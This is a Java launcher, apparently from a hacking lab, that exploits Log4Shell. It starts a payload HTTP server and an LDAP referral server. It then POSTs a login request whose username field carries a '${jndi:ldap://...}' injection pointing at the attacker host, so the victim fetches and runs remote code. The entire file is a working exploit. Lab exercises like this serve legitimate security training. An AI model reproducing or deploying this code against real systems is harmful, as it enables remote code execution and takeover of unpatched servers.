import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class Launcher {
	private static final String HACKERLAB_HOST = "172.20.0.2";
	private static final String VICTIM_HOST = "repository";

	public static void main(String[] args) {
		new PayloadHTTPServer().start();
		new Solver().start();
		new LDAPRefServer().start();
		new Thread(() -> {
			try {
				System.err.println("!! Waiting for 5 seconds to get ready");
				Thread.sleep(5000);
				System.err.printf("!! POSTing Log4j payload%n");
				HttpClient client = HttpClient.newHttpClient();
				client.send(HttpRequest
					.newBuilder()
					.uri(URI.create(String.format("http://%s/auth/login", VICTIM_HOST)))
					.header("Content-Type", "application/x-www-form-urlencoded")
					.POST(HttpRequest.BodyPublishers.ofString(String.format("username=${jndi:ldap://%s/exex}&password=boof", HACKERLAB_HOST)))
					.build(), HttpResponse.BodyHandlers.ofString());
			} catch (Exception e) {
				throw new RuntimeException(e);
			}
		}).start();
	}
}
